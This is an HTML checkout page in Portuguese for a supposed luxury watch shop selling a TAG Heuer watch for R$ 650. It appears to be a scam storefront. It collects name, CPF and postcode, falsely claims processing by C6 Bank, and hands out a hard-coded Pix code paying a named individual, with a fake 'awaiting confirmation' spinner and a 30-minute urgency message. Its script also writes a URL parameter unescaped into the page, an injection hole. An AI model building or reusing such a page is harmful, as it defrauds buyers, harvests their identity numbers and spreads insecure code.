<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Seguro | BARÃO LUXTIME</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700;900&display=swap');
        body { background-color: #050505; color: #ffffff; font-family: 'Montserrat', sans-serif; }
        .gold-text { color: #d4af37; }
        .gold-bg { background: linear-gradient(135deg, #d4af37 0%, #f9e29b 50%, #b38b2d 100%); color: #000; }
        .input-field { background: #111; border: 1px solid #333; color: white; padding: 14px; border-radius: 4px; width: 100%; outline: none; font-size: 12px; }
        .input-field:focus { border-color: #d4af37; }
    </style>
</head>
<body>

    <nav class="flex justify-center items-center px-6 py-8 bg-black border-b border-[#d4af37]/10">
        <div class="text-xl font-black tracking-tighter uppercase">BARÃO <span class="gold-text">LUXTIME</span></div>
    </nav>

    <main id="conteudo-checkout" class="max-w-md mx-auto p-6">
        <div class="mb-8 text-center">
            <h1 class="text-xl font-bold uppercase italic mb-2">Finalizar Pedido</h1>
            <p id="resumo-item" class="text-gray-500 text-[10px] tracking-widest uppercase">Carregando detalhes...</p>
        </div>

        <form id="form-pagamento" class="space-y-4">
            <input type="text" placeholder="NOME COMPLETO" class="input-field uppercase" required>
            <input type="text" id="cpf-input" placeholder="CPF" class="input-field" required>
            <input type="text" placeholder="CEP" class="input-field" required>
            
            <div class="bg-[#111] p-4 rounded border border-gray-900 flex justify-between items-center my-6">
                <span class="text-xs font-bold">TOTAL A PAGAR:</span>
                <span class="gold-text font-black text-xl">R$ 650,00</span>
            </div>

            <button type="submit" class="w-full gold-bg py-5 font-black uppercase text-xs tracking-[0.2em] hover:brightness-110 transition">
                Gerar Código Pix Copia e Cola
            </button>
        </form>

        <div class="mt-8 flex justify-center items-center gap-4 text-gray-600">
            <i class="fa-solid fa-shield-halved text-xl"></i>
            <span class="text-[9px] uppercase tracking-widest font-bold">Pagamento processado via C6 Bank</span>
        </div>
    </main>

    <script>
        const params = new URLSearchParams(window.location.search);
        const item = params.get('item') || "Relógio TAG Heuer Formula 1";
        document.getElementById('resumo-item').innerText = item;

        document.getElementById('form-pagamento').addEventListener('submit', function(e) {
            e.preventDefault();

            // SUA CHAVE PIX REAL ABAIXO
            const chavePix = "00020101021126330014br.gov.bcb.pix0111382630078525204000053039865406650.005802BR5915FELIPE GALDIANO6009SAO PAULO622905251KF57PWNYPNG6YN0ZK5JVGR0Q6304DA5C";

            document.getElementById('conteudo-checkout').innerHTML = `
                <div class="text-center space-y-6 py-4">
                    <div class="flex justify-center">
                        <div class="w-16 h-16 bg-green-500/10 rounded-full flex items-center justify-center border border-green-500/50">
                            <i class="fa-solid fa-check text-green-500 text-3xl"></i>
                        </div>
                    </div>
                    
                    <h2 class="text-xl font-black gold-text uppercase">Pedido Reservado!</h2>
                    <p class="text-[10px] text-gray-400 px-8">A reserva do seu <b>${item}</b> expira em 30 minutos. Pague via Pix para garantir.</p>
                    
                    <div class="bg-[#111] p-6 rounded-lg border border-[#d4af37]/30 mx-2">
                        <p class="text-[10px] text-gray-500 uppercase mb-4 font-bold">Código Pix Copia e Cola:</p>
                        
                        <div class="bg-black p-4 mb-6 rounded border border-gray-800 break-all text-[9px] font-mono text-gray-400 leading-relaxed text-left">
                            ${chavePix}
                        </div>

                        <button onclick="copiarPix('${chavePix}')" class="w-full gold-bg py-5 font-black uppercase text-xs flex items-center justify-center gap-2 shadow-lg shadow-yellow-500/10">
                            <i class="fa-solid fa-copy"></i> Copiar Código
                        </button>
                    </div>

                    <div class="pt-4 animate-pulse">
                        <p class="text-[9px] text-yellow-600 font-bold uppercase tracking-[0.2em]">
                            <i class="fa-solid fa-spinner fa-spin mr-1"></i> Aguardando Confirmação
                        </p>
                    </div>
                </div>
            `;
        });

        function copiarPix(texto) {
            const tempInput = document.createElement("input");
            tempInput.value = texto;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand("copy");
            document.body.removeChild(tempInput);
            alert("Código PIX Copiado! Agora abra o app do seu banco e cole na opção 'Pix Copia e Cola'.");
        }
    </script>

</body>
</html>
